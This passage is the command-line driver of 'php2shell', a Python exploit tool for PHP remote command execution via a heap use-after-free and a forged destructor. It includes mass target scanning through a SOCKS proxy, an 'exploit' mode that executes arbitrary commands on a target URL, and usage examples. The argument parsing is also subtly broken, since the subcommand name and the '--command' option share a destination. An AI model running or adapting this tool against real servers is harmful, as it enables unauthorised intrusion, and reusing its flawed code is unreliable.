            dtor_leak = int(args.dtor, 0)
        except (ValueError, TypeError):
            print(f"  [-] Invalid --dtor: {args.dtor}", file=sys.stderr)
            return 1

    delta = None
    if args.delta:
        try:
            delta = int(args.delta, 0)
        except (ValueError, TypeError):
            print(f"  [-] Invalid --delta: {args.delta}", file=sys.stderr)
            return 1

    command = getattr(args, "command", "id") or "id"
    vector = getattr(args, "vector", "uaf") or "uaf"
    syms_path = getattr(args, "syms", None)

    if vector == "uaf":
        if not syms_path and dtor_leak == 0:
            print("[!] Need --dtor or --syms for UAF mode", file=sys.stderr)
            return 1
        uaf = UAFOpportunistic(url, dtor_leak, delta, command, verbose=not args.quiet)
        if syms_path:
            extracted = uaf.extract_delta_from_binary(syms_path)
            if extracted:
                dtor_leak, call_addr, delta = extracted
                print(f"  [+] Using extracted offsets: dtor=0x{dtor_leak:x}, delta=0x{delta:x}", flush=True)
        return 0 if uaf.run() else 1

    # BUG-02: pDetector stub
    elif vector == "pdetector":
        print("[*] pDetector vector: stub (not yet implemented)", flush=True)
        print("[*] Use --vector uaf for the working exploit path", flush=True)
        return 0

    print(f"  [-] Unknown vector: {vector}", file=sys.stderr)
    return 1

def main():
    parser = argparse.ArgumentParser(
        description="php2shell: dual-vector research tool for CVE-2026-109618 / CVE-2026-109619",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Vectors:
  uaf (default)         -- session.upload_progress heap UAF (CVE-2026-109618)
  pdetector             -- forged pDestructor, zif_system hijack (CVE-2026-109619, stub)

Examples:
  # Check mode (fingerprint, read-only)
  python php2shell.py check -u http://target/
  python php2shell.py check -f targets.txt --json

  # UAF exploit (CVE-2026-109618), default command is id
  python php2shell.py exploit -u http://target/ --vector uaf --dtor 0x12345678 --delta 0x100 --command "id"

  # Extract offsets from a local libphp.so
  python php2shell.py syms /path/to/libphp.so

  # pDetector exploit (CVE-2026-109619, stub: prints calibration requirements)
  python php2shell.py exploit -u http://target/ --vector pdetector
"""
    )

    subparsers = parser.add_subparsers(dest="command", help="Command to run")

    # Check subcommand
    check_parser = subparsers.add_parser("check", help="Check target(s) for php2shell vulnerability")
    check_parser.add_argument("-u", "--url", help="Target URL")
    check_parser.add_argument("-f", "--file", help="File with one URL per line")
    check_parser.add_argument("-w", "--workers", type=int, default=5, help="Parallel workers")
    check_parser.add_argument("-t", "--timeout", type=float, default=10.0, help="Request timeout")
    check_parser.add_argument("--proxy", help="SOCKS5 proxy host:port (overrides PHP2SHELL_PROXY env var)")
    check_parser.add_argument("--output", "-o", help="Output file for JSON lines")
    check_parser.add_argument("--json", action="store_true", help="Output as JSON")
    check_parser.add_argument("-q", "--quiet", action="store_true", help="Suppress output")

    # Exploit subcommand
    exploit_parser = subparsers.add_parser("exploit", help="Run exploit against target")
    exploit_parser.add_argument("-u", "--url", required=True, help="Target URL")
    exploit_parser.add_argument("-c", "--command", default="id", help="Command to execute")
    exploit_parser.add_argument("--calib", help="Calibration file (key=value)")
    exploit_parser.add_argument("--syms", help="Extract offsets from libphp.so binary")
    exploit_parser.add_argument("--vector", choices=["pdetector", "uaf"], default="uaf",
                               help="Attack vector")
    exploit_parser.add_argument("--dtor", help="DTOR leak address for UAF mode (hex)")
    exploit_parser.add_argument("--delta", help="DTOR-to-call delta for UAF mode (hex)")
    exploit_parser.add_argument("-q", "--quiet", action="store_true", help="Suppress output")

    # Syms subcommand (BUG-10: add binary path argument)
    syms_parser = subparsers.add_parser("syms", help="Extract offsets from libphp.so")
    syms_parser.add_argument("binary", help="Path to libphp.so binary")

    args = parser.parse_args()

    # Handle --syms flag (without subcommand)
    if getattr(args, "syms", None) and not args.command:
        run_syms_mode(args.syms, verbose=True)
        return 0

    # BUG-10: Handle syms subcommand with binary argument
    if args.command == "syms":
        run_syms_mode(args.binary, verbose=True)
        return 0

    # Dispatch to subcommands
    if args.command == "check":
        return run_check_mode(args)
    elif args.command == "exploit":
        return run_exploit(args)
    else:
        # Default: check mode
        return run_check_mode(args)

if __name__ == "__main__":
    sys.exit(main())
